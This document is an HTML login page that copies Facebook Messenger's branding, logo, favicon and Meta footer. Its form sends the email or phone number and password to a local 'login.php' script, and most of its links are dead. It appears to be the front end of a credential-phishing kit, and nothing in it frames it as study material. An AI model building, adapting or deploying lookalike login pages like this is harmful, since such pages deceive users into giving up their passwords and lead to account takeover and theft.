<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messenger – Log in</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0099ff 0%, #a033ff 50%, #ff5280 75%, #ff7061 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .messenger-logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .messenger-logo svg {
            width: 64px;
            height: 64px;
            filter: drop-shadow(0 4px 12px rgba(0,0,0,.2));
        }
        .messenger-title {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            text-shadow: 0 1px 4px rgba(0,0,0,.15);
        }
        .messenger-subtitle {
            text-align: center;
            font-size: 15px;
            color: rgba(255,255,255,.85);
            margin-bottom: 32px;
        }
        .login-card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,.15);
            padding: 24px;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .form-input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            color: #1d2129;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .form-input:focus {
            border-color: #0099ff;
            box-shadow: 0 0 0 2px rgba(0,153,255,.15);
        }
        .form-input::placeholder { color: #96999e; }
        .btn-login {
            width: 100%;
            background: linear-gradient(135deg, #0099ff, #a033ff);
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 14px 16px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 4px;
        }
        .btn-login:hover { opacity: 0.9; }
        .btn-login:active { opacity: 0.8; }
        .card-links {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            margin-top: 16px;
        }
        .card-links a {
            color: #0099ff;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .card-links a:hover { text-decoration: underline; }
        .divider {
            border-top: 1px solid #dadde1;
            width: 100%;
        }
        .btn-create {
            background: none;
            border: 2px solid #dadde1;
            border-radius: 8px;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 700;
            color: #1c1e21;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
        }
        .btn-create:hover { background: #f5f6f7; }
        .bottom-text {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: rgba(255,255,255,.7);
        }
        .bottom-text a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
        }
        .bottom-text a:hover { text-decoration: underline; }
        .meta-bottom {
            text-align: center;
            margin-top: 32px;
            font-size: 12px;
            color: rgba(255,255,255,.5);
        }
        @media (max-width: 480px) {
            .login-container { padding: 16px; }
            .messenger-title { font-size: 20px; }
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="messenger-logo">
        <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="msg-grad" x1="50%" y1="0%" x2="50%" y2="100%">
                    <stop offset="0%" stop-color="#00B2FF"/>
                    <stop offset="100%" stop-color="#006AFF"/>
                </linearGradient>
            </defs>
            <circle cx="18" cy="18" r="18" fill="url(#msg-grad)"/>
            <path fill="#fff" d="M18 6.6c-6.6 0-11.4 4.5-11.4 10.8 0 3.3 1.6 6.3 4.2 8.2v4l3.8-2.1c1 .3 2.1.4 3.4.4 6.6 0 11.4-4.5 11.4-10.8C29.4 11 24.6 6.6 18 6.6zm1.2 14.5l-2.9-3.1-5.6 3.1 6.2-6.6 2.9 3.1 5.6-3.1-6.2 6.6z"/>
        </svg>
    </div>
    <h1 class="messenger-title">Log in to Messenger</h1>
    <p class="messenger-subtitle">Connect with friends and family instantly</p>

    <div class="login-card">
        <form class="login-form" action="login.php" method="POST" autocomplete="off">
            <input type="text" name="username" class="form-input" placeholder="Email address or phone number" required>
            <input type="password" name="password" class="form-input" placeholder="Password" required>
            <button type="submit" class="btn-login">Log in</button>
        </form>
        <div class="card-links">
            <a href="#">Forgotten password?</a>
            <div class="divider"></div>
            <button class="btn-create" type="button">Create new account</button>
        </div>
    </div>

    <div class="bottom-text">
        <a href="#">Keep me signed in</a> · <a href="#">Privacy Policy</a> · <a href="#">Terms</a>
    </div>
    <div class="meta-bottom">Meta © 2026</div>
</div>
</body>
</html>
